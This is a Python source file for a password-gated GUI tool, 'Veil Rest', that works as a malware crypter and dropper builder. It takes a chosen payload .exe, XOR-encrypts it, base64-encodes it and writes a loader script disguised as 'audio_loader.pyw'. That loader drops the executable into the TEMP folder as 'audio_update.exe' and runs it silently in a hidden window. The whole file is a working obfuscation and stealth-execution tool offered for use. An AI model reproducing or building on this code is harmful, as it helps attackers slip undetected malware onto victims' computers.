import os
import random
import base64
import subprocess
import tkinter as tk
from tkinter import filedialog, messagebox
try:
    import customtkinter as ctk
except ImportError:
    subprocess.check_call(["pip", "install", "customtkinter"])
    import customtkinter as ctk

import winsound
from PIL import Image, ImageTk

ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

class PasswordDialog(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Security Check")
        self.geometry("400x220")
        self.resizable(False, False)
        self.configure(fg_color="#4a1515")

        self.warning_label = ctk.CTkLabel(self, text="RESTRICTED ACCESS", font=("Arial", 18, "bold"), text_color="#ff4d4d")
        self.warning_label.pack(pady=(20, 10))

        self.instruction_label = ctk.CTkLabel(self, text="Enter the password to launch REST:", font=("Arial", 12))
        self.instruction_label.pack(pady=5)

        self.password_entry = ctk.CTkEntry(self, placeholder_text="Password...", show="*", width=280, height=35)
        self.password_entry.pack(pady=15)

        self.submit_btn = ctk.CTkButton(self, text="Authenticate", fg_color="#cc0000", hover_color="#990000", command=self.check_password, width=120)
        self.submit_btn.pack(pady=10)

        self.authenticated = False

    def check_password(self):
        pwd = self.password_entry.get()
        if pwd == "VEIL.NET":
            self.authenticated = True
            self.destroy()
        else:
            messagebox.showerror("Error", "Incorrect Password!")
            self.password_entry.delete(0, tk.END)

class RestApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("REST - V.1.2")
        self.geometry("600x450")
        self.resizable(False, False)

        try:
            sound_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sound.wav")
            if os.path.exists(sound_path):
                winsound.PlaySound(sound_path, winsound.SND_ASYNC | winsound.SND_FILENAME)
        except Exception:
            pass

        try:
            icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "icon.ico")
            if os.path.exists(icon_path):
                self.iconbitmap(icon_path)
        except Exception:
            pass

        try:
            bg_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bg.png")
            if os.path.exists(bg_path):
                self.bg_image = Image.open(bg_path).resize((600, 450), Image.Resampling.LANCZOS)
                self.bg_photo = ImageTk.PhotoImage(self.bg_image)
                self.bg_label = tk.Label(self, image=self.bg_photo)
                self.bg_label.place(x=0, y=0, relwidth=1, relheight=1)
        except Exception:
            pass

        self.title_label = ctk.CTkLabel(self, text="Veil Rest", font=("Arial", 18, "bold"), text_color="#9370DB")
        self.title_label.pack(pady=(20, 10))

        self.file_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.file_frame.pack(fill="x", padx=30, pady=15)

        self.file_path_entry = ctk.CTkEntry(self.file_frame, placeholder_text="Select payload .exe...", width=420, height=35)
        self.file_path_entry.pack(side="left", padx=(0, 10))

        self.browse_btn = ctk.CTkButton(self.file_frame, text="Browse", width=80, height=35, command=self.browse_file)
        self.browse_btn.pack(side="right")

        self.generate_btn = ctk.CTkButton(self, text="Build", fg_color="#2fa572", hover_color="#248258", font=("Arial", 14, "bold"), height=45, command=self.generate)
        self.generate_btn.pack(fill="x", padx=30, pady=20)

        self.status_label = ctk.CTkLabel(self, text="Status: Ready", font=("Arial", 11), text_color="gray")
        self.status_label.pack(pady=10)

        self.watermark_label = ctk.CTkLabel(self, text="By Mohaned", font=("Arial", 11, "bold"), text_color="#ff0000")
        self.watermark_label.place(relx=0.95, rely=0.93, anchor="se")

    def browse_file(self):
        file_path = filedialog.askopenfilename(title="Select Payload", filetypes=[("Executable Files", "*.exe"), ("All Files", "*.*")])
        if file_path:
            self.file_path_entry.delete(0, tk.END)
            self.self_path = file_path
            self.file_path_entry.insert(0, file_path)

    def generate(self):
        file_path = self.file_path_entry.get()
        if not file_path or not os.path.exists(file_path):
            messagebox.showerror("Error", "Please select a valid .exe file!")
            return

        try:
            self.status_label.configure(text="Status: Processing...", text_color="orange")
            self.update()

            with open(file_path, "rb") as f:
                data = f.read()

            key = random.randint(1, 255)
            encrypted = bytearray([b ^ key for b in data])
            encoded = base64.b64encode(encrypted).decode('utf-8')

            loader_code = f'''import base64, os, subprocess
k = {key}
enc = "{encoded}"
try:
    decoded = base64.b64decode(enc)
    original = bytes([b ^ k for b in decoded])
    path = os.path.join(os.environ['TEMP'], 'audio_update.exe')
    with open(path, 'wb') as f:
        f.write(original)
    subprocess.Popen(path, creationflags=subprocess.CREATE_NO_WINDOW)
except Exception:
    pass
'''
            output_file = os.path.join(os.path.dirname(file_path), "audio_loader.pyw")
            with open(output_file, "w", encoding="utf-8") as f:
                f.write(loader_code)

            self.status_label.configure(text="Status: Success!", text_color="green")
            messagebox.showinfo("REST Success", f"تم إنشاء ملف لا تطبح شخص ماسوالك شي    :\n{output_file}\n\nاً.")

        except Exception as e:
            messagebox.showerror("Error", str(e))
            self.status_label.configure(text="Status: Failed", text_color="red")

if __name__ == "__main__":
    pwd_app = PasswordDialog()
    pwd_app.mainloop()

    if pwd_app.authenticated:
        app = RestApp()
        app.mainloop()